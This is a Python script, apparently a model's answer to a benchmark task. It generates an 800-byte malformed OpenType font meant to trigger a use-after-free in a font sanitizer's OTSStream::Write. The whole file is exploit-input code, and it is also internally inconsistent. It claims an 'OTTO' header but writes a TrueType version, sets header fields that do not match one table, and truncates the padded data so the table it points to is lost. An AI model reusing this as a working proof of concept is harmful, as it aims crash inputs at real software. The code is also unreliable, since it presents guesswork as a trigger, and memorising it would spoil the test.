class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal malformed OpenType font to potentially trigger UAF in OTSStream::Write
        # Starts with OTTO header, single table with invalid offset/length to cause heap issues
        import struct
        
        # Header: version 1.0, 1 table, standard ranges
        version = b'\x00\x01\x00\x00'
        num_tables = struct.pack('>H', 1)
        search_range = b'\x00\x10'
        entry_selector = b'\x00\x01'
        range_shift = b'\x00\x0e'
        
        header = version + num_tables + search_range + entry_selector + range_shift
        
        # Table record for 'head': tag, checksum=0, offset=invalid large, length=small
        tag = b'head'
        checksum = struct.pack('>I', 0)
        offset = struct.pack('>I', 0x1000)  # Invalid offset to trigger potential UAF
        length = struct.pack('>I', 0x10)    # Small length
        
        table_record = tag + checksum + offset + length
        
        # Pad to table offset (should be 16 bytes after header for alignment, but malformed)
        padding_to_offset = b'\x00' * (0x1000 - len(header + table_record))
        
        # Dummy table data, short to cause issues
        table_data = b'\x00' * 0x10
        
        # Total PoC: header + record + padding + data, then pad to ~800 for ground-truth length
        poc = header + table_record + padding_to_offset + table_data
        poc += b'\x00' * (800 - len(poc))
        
        return poc[:800]  # Ensure exactly 800 bytes